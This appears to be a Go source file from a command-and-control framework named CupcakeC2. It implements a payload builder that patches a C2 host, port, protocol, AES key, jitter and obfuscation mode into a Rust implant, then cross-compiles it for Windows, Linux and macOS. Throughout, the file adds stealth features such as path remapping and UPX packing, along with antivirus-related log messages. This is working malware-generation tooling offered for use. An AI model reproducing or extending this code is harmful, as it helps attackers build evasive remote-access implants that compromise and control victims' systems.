package services

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"github.com/google/uuid"
	"cupcake-server/pkg/store"
)

const (
	SourceDir      = "../Client"           // Relative to server/
	BuildBaseDir   = "./temp_builds"      // Sandbox root
	ArtifactDir    = "./storage/payloads" // Final storage
	SharedTargetDir = "./storage/build_cache/target" // Shared cargo target directory
)

type PayloadConfig struct {
	Arch              string `json:"arch"`
	Protocol          string `json:"protocol"`
	Host              string `json:"host"`
	Port              string `json:"port"`
	AESKey            string `json:"aes_key"`
	HeartbeatInterval int    `json:"heartbeat_interval"`
	DNSResolver       string `json:"dns_resolver"`
	OSType            string `json:"os_type"`
	AutoDestruct      bool   `json:"auto_destruct"`
	SleepTime         int    `json:"sleep_time"`
	UseUPX            bool   `json:"use_upx"`
	EncryptionSalt    string `json:"encryption_salt"`
	ObfuscationMode   string `json:"obfuscation_mode"`
	Jitter            int    `json:"jitter"`
}

// copyDir recursively copies a directory tree
func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil { return err }
		relPath, _ := filepath.Rel(src, path)
		
		// 🛡️ Skip target folders, git history, and other heavy/unnecessary files
		name := info.Name()
		if info.IsDir() && (name == "target" || name == ".git" || name == ".idea" || name == ".vscode") {
			return filepath.SkipDir
		}
		
		dstPath := filepath.Join(dst, relPath)
		if info.IsDir() { return os.MkdirAll(dstPath, info.Mode()) }
		
		sf, err := os.Open(path); if err != nil { return err }; defer sf.Close()
		df, err := os.Create(dstPath); if err != nil { return err }; defer df.Close()
		if _, err := io.Copy(df, sf); err != nil { return err }
		return os.Chmod(dstPath, info.Mode())
	})
}

// BuildAgentWithLogger compiles the Rust agent in a sandboxed environment and streams logs
func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, error) {
	buildID := uuid.New().String()
	workspace := filepath.Join(BuildBaseDir, buildID)
	
	os.MkdirAll(BuildBaseDir, 0755)
	os.MkdirAll(ArtifactDir, 0755)
	os.MkdirAll(SharedTargetDir, 0755)

	if logChan != nil { logChan <- "[Builder] 正在准备沙箱环境 (已启用增量编译缓存)..." }
	if err := copyDir(SourceDir, workspace); err != nil {
		return "", fmt.Errorf("failed to create sandbox: %v", err)
	}
	defer os.RemoveAll(workspace)

	var connStr string
	protocol := strings.ToLower(conf.Protocol)
	if protocol == "tcp" {
		connStr = fmt.Sprintf("%s:%s", conf.Host, conf.Port)
	} else if protocol == "dns" {
		connStr = conf.Host 
	} else if protocol == "bind-tcp" || protocol == "正向tcp" {
		connStr = fmt.Sprintf("bind://0.0.0.0:%s", conf.Port)
	} else {
		connStr = fmt.Sprintf("ws://%s:%s/ws", conf.Host, conf.Port)
	}

	if logChan != nil { logChan <- "[Builder] CupcakeC2 v3.0.5 核心引擎初始化..." }

	configPath := filepath.Join(workspace, "core", "src", "config.rs")
	if logChan != nil { logChan <- "[Builder] 正在注入 C2 终结点与加密配置..." }

	// Fetch System AES Key if none provided
	aesKey := conf.AESKey
	if aesKey == "" {
		aesKey = store.GetSetting("system_aes_key")
		if logChan != nil { logChan <- "[Builder] 密钥采用系统预设值" }
	}

	if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.Jitter, conf.DNSResolver, conf.EncryptionSalt, conf.ObfuscationMode); err != nil {
		return "", fmt.Errorf("config patch failed: %v", err)
	}

	if logChan != nil {
		logChan <- "\x1b[32m[Builder] 配置注入成功! 准备构建受控端核心...\x1b[0m"
		logChan <- "\x1b[36m[Builder] 如果系统正在由于病毒查报导致文件被占用，以下过程可能会稍有延迟...\x1b[0m"
	}

	args := []string{"build", "-p", "cupcake-core", "--release"}
	target := ""
	// Determine Cargo Target based on OS and Arch Matrix
	if conf.OSType == "windows" {
		if runtime.GOOS == "linux" {
			if strings.Contains(conf.Arch, "amd64") {
				target = "x86_64-pc-windows-gnu"
			} else if strings.Contains(conf.Arch, "i386") {
				target = "i686-pc-windows-gnu"
			}
		} else {
			if strings.Contains(conf.Arch, "amd64") {
				target = "x86_64-pc-windows-msvc"
			} else if strings.Contains(conf.Arch, "i386") {
				target = "i686-pc-windows-msvc"
			}
		}
	} else if conf.OSType == "linux" {
		if strings.Contains(conf.Arch, "arm64") {
			target = "aarch64-unknown-linux-musl"
		} else if strings.Contains(conf.Arch, "arm") && !strings.Contains(conf.Arch, "arm64") {
			target = "armv7-unknown-linux-musleabihf"
		} else if strings.Contains(conf.Arch, "i386") {
			target = "i686-unknown-linux-musl"
		} else {
			target = "x86_64-unknown-linux-musl"
		}
	} else if conf.OSType == "darwin" {
		if strings.Contains(conf.Arch, "amd64") {
			target = "x86_64-apple-darwin"
		} else if strings.Contains(conf.Arch, "arm64") {
			target = "aarch64-apple-darwin"
		}
	}

	// Sanitize OS and Arch to prevent path traversal
	conf.OSType = filepath.Base(conf.OSType)
	conf.Arch = filepath.Base(conf.Arch)

	// Only append --target if cross-compiling
	if target != "" && (runtime.GOOS != conf.OSType || runtime.GOARCH != strings.Replace(conf.Arch, conf.OSType+"_", "", 1)) {
		args = append(args, "--target", target)
	}

	if protocol == "tcp" {
		args = append(args, "--no-default-features", "--features", "tcp")
	} else if protocol == "bind-tcp" || protocol == "正向tcp" {
		args = append(args, "--no-default-features", "--features", "tcp_bind")
	} else if protocol == "dns" {
		args = append(args, "--no-default-features", "--features", "dns")
	} else {
		args = append(args, "--features", "ws")
	}

	if logChan != nil { 
		modeStr := "全量构建"
		if _, err := os.Stat(SharedTargetDir); err == nil { modeStr = "增量加速模式" }
		logChan <- fmt.Sprintf("[Builder] 正在启动 Rust 编译器 (%s)...", modeStr) 
		logChan <- "[Builder] 提示: 如果底层依赖已缓存，本过程将很快跳过..."
	}

	cmd := exec.Command("cargo", args...)
	cmd.Dir = workspace
	
	// Add parent environment and force color/progress
	// ⚡ OPTIMIZATION: Use a centralized target directory to enable incremental compilation
	// 🛡️ STEALTH: Remap source paths to hide local directory structure
	absTargetDir, _ := filepath.Abs(SharedTargetDir)
	absWorkspace, _ := filepath.Abs(workspace)
	
	cmd.Env = append(os.Environ(), 
		"CARGO_TERM_COLOR=never",
		fmt.Sprintf("CARGO_TARGET_DIR=%s", absTargetDir),
		fmt.Sprintf("RUSTFLAGS=--remap-path-prefix %s=/cupcake --remap-path-prefix %s=/rust", absWorkspace, os.Getenv("USERPROFILE")),
	)
	
	// Stream logs: Combine Stdout and Stderr to avoid MultiReader blocking
	pipeReader, pipeWriter := io.Pipe()
	cmd.Stdout = pipeWriter
	cmd.Stderr = pipeWriter
	
	if logChan != nil { logChan <- fmt.Sprintf("[Builder] 执行命令: cargo %s", strings.Join(args, " ")) }
	
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start cargo: %v", err)
	}

	// Log reader in its own goroutine
	go func() {
		scanner := bufio.NewScanner(pipeReader)
		for scanner.Scan() {
			line := scanner.Text()
			if logChan != nil {
				select {
				case logChan <- line:
				default:
				}

				// 🚀 HUMAN TOUCH: Detect when cargo reaches the linking phase
				if strings.Contains(line, "Compiling") && strings.Contains(line, "cupcake-core") {
					logChan <- "\x1b[35m[Builder] 编译阶段基本完成，正在进入全局链接与 LTO 体积优化阶段...\x1b[0m"
					logChan <- "\x1b[33m[Builder] 提示：该步涉及跨模块重组，耗时较长（约 30s），请耐心等待窗口自动弹出。\x1b[0m"
				}
			}
		}
		pipeReader.Close()
	}()

	waitErr := cmd.Wait()
	pipeWriter.Close() // This will trigger EOF on the scanner

	if waitErr != nil {
		return "", fmt.Errorf("cargo build failed: %v", waitErr)
	}

	binaryName := "cupcake-core"
	if conf.OSType == "windows" { binaryName += ".exe" }

	// 🔍 Find the built binary
	var builtPath string
	if target != "" && (runtime.GOOS != conf.OSType || runtime.GOARCH != strings.Replace(conf.Arch, conf.OSType+"_", "", 1)) {
		builtPath = filepath.Join(absTargetDir, target, "release", binaryName)
	} else {
		builtPath = filepath.Join(absTargetDir, "release", binaryName)
	}

	if _, err := os.Stat(builtPath); err != nil {
		return "", fmt.Errorf("binary not found at %s: ensure 'cupcake-core' package is correctly configured", builtPath)
	}

	ext := ""
	if conf.OSType == "windows" { ext = ".exe" }
	finalPath := filepath.Join(ArtifactDir, fmt.Sprintf("agent_%s_%s%s", conf.Arch, buildID[:8], ext))


	if logChan != nil { logChan <- "[Builder] 正在对本地 Loader 执行配置补丁..." }
	if err := moveFile(builtPath, finalPath); err != nil { return "", fmt.Errorf("failed to save artifact: %v", err) }

	// 📦 UPX 极限压缩支持
	if conf.UseUPX {
		if logChan != nil { logChan <- "[Builder] 正在执行 UPX 极限压缩..." }
		if err := RunUPX(finalPath); err != nil {
			if logChan != nil { logChan <- "[!] UPX 失败: " + err.Error() }
		} else {
			if logChan != nil { logChan <- "[+] UPX 压缩成功" }
		}
	}

	if logChan != nil { logChan <- "[Builder] 构建成功!" }
	return finalPath, nil
}

// RunUPX 执行 UPX 压缩
func RunUPX(path string) error {
	cmd := exec.Command("upx", "-9", "--force", path)
	return cmd.Run()
}

// RebuildTemplates (v3.0.1 Engine)
// This function rebuilds all standard platform templates and moves them to server/assets
// enabling the 'Patch' mode to always use the latest v3.0.1 features.
func RebuildTemplates(logChan chan<- string) error {
	if logChan != nil { logChan <- "[Rebuilder] 启动 CupcakeC2 v3.0.1 全平台模板自动化构建任务..." }
	
	targets := []struct {
		OS       string
		Arch     string
		Protocol string
		OutName  string
	}{
		{"windows", "amd64", "ws", "client_template_windows.exe"},
		{"windows", "i386", "ws", "client_template_windows_x86.exe"},
		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe"},
		{"windows", "amd64", "dns", "client_template_windows_dns.exe"},
		{"linux", "amd64", "ws", "client_template_linux"},
		{"linux", "arm64", "ws", "client_template_linux_arm64"},
	}

	for _, t := range targets {
		conf := PayloadConfig{
			OSType:            t.OS,
			Arch:              t.Arch,
			Protocol:          t.Protocol,
			Host:              "127.0.0.1",
			Port:              "8080",
			AESKey:            "SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_", // Default placeholder
			HeartbeatInterval: 10,
		}
		
		if logChan != nil { logChan <- fmt.Sprintf("[Rebuilder] 正在编译模板: %s...", t.OutName) }
		path, err := BuildAgentWithLogger(conf, nil)
		if err != nil {
			if logChan != nil { logChan <- fmt.Sprintf("[!] 模板编译失败 (%s): %v", t.OutName, err) }
			continue
		}
		
		// Move to assets
		dest := filepath.Join("assets", t.OutName)
		if err := os.Rename(path, dest); err != nil {
			// Try copy if rename fails across partitions
			if err := copyFile(path, dest); err == nil {
				os.Remove(path)
			}
		}
		if logChan != nil { logChan <- fmt.Sprintf("[+] 模板已就绪: assets/%s", t.OutName) }
	}

	if logChan != nil { logChan <- "[Rebuilder] v3.0.1 模板集更新完成。" }
	return nil
}

// Extension of services to support cloning for shellcode
func copyFile(src, dst string) error {
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	_, err = io.Copy(df, sf)
	return err
}

func patchConfig(path, connStr, aesKey string, heartbeat int, jitter int, dnsResolver string, salt string, obfMode string) error {
	content, err := os.ReadFile(path)
	if err != nil { return err }
	s := string(content)

	// 1. URL Patch (Static only)
	s = strings.Replace(s, "REPLACE_ME_URL", connStr, 1)
	
	// 2. AES Key Patch (Static only)
	if aesKey != "" {
		if !isValidAESKeyString(aesKey) {
			return fmt.Errorf("AES key must be 32 bytes ASCII or 64 hex characters")
		}
		s = strings.Replace(s, "REPLACE_ME_AES_KEY", aesKey, 1)
	}

	// 3. Encryption Salt & Obfuscation
	// In Source Patching mode, we ONLY replace the constants.
	// Do NOT touch SYSTEM_PROVIDER_CRYPTO_KDF_SALT or OBF_MODE_STRICT in source code
	// because they are fixed-size arrays and changing their literal length breaks compilation.
	s = strings.Replace(s, "REPLACE_ME_SALT", salt, 1)
	
	// 4. Jitter Patch
	jitterStr := fmt.Sprintf("%d", jitter)
	s = strings.Replace(s, "REPLACE_ME_JITTER", jitterStr, 1)
	
	obfVal := strings.ToLower(obfMode)
	if obfVal == "" { obfVal = "none" }
	s = strings.Replace(s, "REPLACE_ME_OBF", obfVal, 1)
	
	return os.WriteFile(path, []byte(s), 0644)
}

func isValidAESKeyString(key string) bool {
	key = strings.TrimSpace(key)
	if len(key) == 32 {
		return true
	}
	if len(key) == 64 && isHexString(key) {
		return true
	}
	return false
}

func moveFile(src, dst string) error {
	if err := os.Rename(src, dst); err == nil { return nil }
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	if _, err := io.Copy(df, sf); err != nil { return err }
	return os.Remove(src)
}
